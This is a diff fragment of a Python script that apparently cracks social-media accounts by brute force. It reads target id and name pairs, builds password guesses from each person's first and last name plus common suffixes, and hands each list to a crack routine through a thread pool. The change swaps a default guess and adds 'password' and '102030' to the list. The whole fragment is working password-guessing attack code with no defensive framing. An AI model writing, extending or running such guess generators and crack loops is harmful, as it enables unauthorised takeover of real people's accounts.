@@ -281,7 +281,7 @@ def name2():
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
 			lst = nmf.split(' ')[1]
-			pwv = ['445566']
+			pwv = ['556677']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -302,7 +302,8 @@ def name2():
 					pwv.append(lst+'1234')
 					pwv.append(lst+'786')
 					pwv.append(frs+'12')
-					pwv.append(lst+'12')
+					pwv.append('password')
+					pwv.append('102030')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
